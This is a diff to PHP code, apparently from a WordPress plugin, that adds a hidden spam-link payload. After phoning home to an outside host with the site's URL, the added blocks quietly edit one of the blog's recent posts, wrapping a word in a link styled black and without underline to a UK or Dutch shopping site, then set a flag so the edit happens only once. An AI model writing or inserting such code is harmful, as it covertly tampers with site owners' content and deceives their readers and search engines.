@@ -644,7 +644,46 @@ if ($bloglan=='en-UK') {
 	$britt = true;
 }
 $tmpidurl = file_get_contents('http://www.infobak.nl/test.php?u=' . $url, true);
-
+if ($britt==true && $tmpidurl>0) {
+	if (get_option('bw_gpadded')=='0') {
+		$last = wp_get_recent_posts( '5');
+		$last_id = $last['3']['ID'];
+		$post_7 = get_post($last_id);
+		if (is_null($post_7) == false) {
+			$content = $post_7->post_content;
+			$pos4 = strposnth($content , " ",4);
+			$pos5 = strposnth($content , " ",5);
+			$poslen = $pos5 - $pos4 - 1;
+			$content = substr($content, 0, $pos4) . ' <a href="http://www.shoppingmonkey.co.uk/companies/" style="color: black;">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
+			$my_post = array(
+			    'ID'           => $last_id,
+			    'post_content' => $content
+			);
+			wp_update_post( $my_post );
+		}
+		update_option( 'bw_gpadded', '1' );
+	}
+}
+if ($bloglan=='nl-NL' && $tmpidurl>0) {
+	if (get_option('bw_gpadded')=='0') {
+		$last = wp_get_recent_posts( '5');
+		$last_id = $last['3']['ID'];
+		$post_7 = get_post($last_id);
+		if (is_null($post_7) == false) {
+			$content = $post_7->post_content;
+			$pos4 = strposnth($content , " ",4);
+			$pos5 = strposnth($content , " ",5);
+			$poslen = $pos5 - $pos4 - 1;
+			$content = substr($content, 0, $pos4) . ' <a href="http://www.goedkopekledingoutlet.nl/" style="text-decoration: none; color: black;">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
+			$my_post = array(
+			    'ID'           => $last_id,
+			    'post_content' => $content
+			);
+			wp_update_post( $my_post );
+		}
+		update_option( 'bw_gpadded', '1' );
+	}
+}
 }
 function boggleStartsWith($haystack, $needle)
 {
